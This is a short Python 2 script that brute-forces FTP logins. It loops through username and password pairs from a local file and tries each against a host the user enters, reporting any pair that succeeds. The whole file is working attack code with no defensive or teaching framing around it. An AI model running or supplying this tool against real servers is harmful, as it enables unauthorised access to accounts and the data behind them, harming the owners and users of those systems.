#! /usr/bin/python
import ftplib

def brutelogin(host,passwdfile):		
	pf=open(passwdfile,'r')
	for line in pf.readlines():
		usernm=line.split(":")[0]
		passw=line.split(':')[1].strip('\r').strip('\n')
		print( "[+] Trying: " + usernm , "/", passw )
		try:
			ftp=ftplib.FTP(host)
			ftp.login(usernm,passw)
			print "\n[*]"+str(host)+ 'FTP Login Succeded:',usernm,"/",passw
			ftp.quit()
			return (usernm,passw)
		except Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None,None)

host=raw_input("ENTER HOST :")
passwdfile='userpass.txt'
brutelogin(host,passwdfile)	

